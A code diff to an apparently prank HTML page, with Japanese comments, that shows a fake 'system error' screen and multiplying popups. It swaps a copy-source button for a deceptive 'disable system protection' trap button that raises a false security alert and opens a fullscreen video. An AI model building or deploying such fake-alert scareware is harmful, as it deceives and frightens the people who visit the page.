@@ -52,7 +52,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            z-index: 9999;
+            z-index: 99999; /* 最前面に配置 */
             background-color: black;
             display: flex;
             align-items: center;
@@ -65,7 +65,7 @@
             width: auto;
             height: auto;
         }
-        .copy-button {
+        .trap-button {
             position: fixed;
             top: 20px;
             right: 20px;
@@ -79,25 +79,17 @@
             z-index: 9000;
             box-shadow: 0 0 10px red;
         }
-        .copy-button:hover {
+        .trap-button:hover {
             background-color: darkred;
             color: red;
         }
         @keyframes fadeIn {
-            from {
-                opacity: 0;
-            }
-            to {
-                opacity: 1;
-            }
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
         @keyframes fadeOut {
-            from {
-                opacity: 1;
-            }
-            to {
-                opacity: 0;
-            }
+            from { opacity: 1; }
+            to { opacity: 0; }
         }
         .close-btn {
             background-color: red;
@@ -115,7 +107,8 @@
     </style>
 </head>
 <body>
-    <button class="copy-button" onclick="copyToClipboard();">コード コピー</button>
+    <!-- 救いに見せかけた罠ボタン -->
+    <button class="trap-button" onclick="triggerTrap();">⚠️ システム保護を解除</button>
     
     <h1>システムエラーを検出</h1>
     <p>IP アドレスを取得中…</p>
@@ -131,20 +124,10 @@
         let maxSpeedStartTime = null;
         let sessionStartTime = null;
 
-        function copyToClipboard() {
-            const htmlCode = document.documentElement.outerHTML;
-            navigator.clipboard.writeText(htmlCode).then(() => {
-                alert('コードをコピーしました！');
-            }).catch(() => {
-                // フォールバック
-                const textarea = document.createElement('textarea');
-                textarea.value = htmlCode;
-                document.body.appendChild(textarea);
-                textarea.select();
-                document.execCommand('copy');
-                document.body.removeChild(textarea);
-                alert('コードをコピーしました！');
-            });
+        // 罠ボタンを押したときの即死処理
+        function triggerTrap() {
+            alert('⚠️ エラー: 保護機能の解除に失敗しました。\n緊急セキュリティプロセスを実行します。');
+            showFullscreenVideo();
         }
 
         function getRandomPosition() {
@@ -284,14 +267,12 @@
                     return;
                 }
                 
+                // 最高速度時は「1枚→2枚」に増殖
                 if (isMaxSpeed) {
                     createPopup(false);
                     setTimeout(() => {
-                        createPopup(true);
+                        createPopup(shouldShowImage()); // 2枚目は低確率で画像
                     }, 50);
-                    setTimeout(() => {
-                        createPopup(false);
-                    }, 100);
                 } else {
                     autoClickInterval = Math.max(minInterval, autoClickInterval - 300);
                     const hasImage = shouldShowImage();
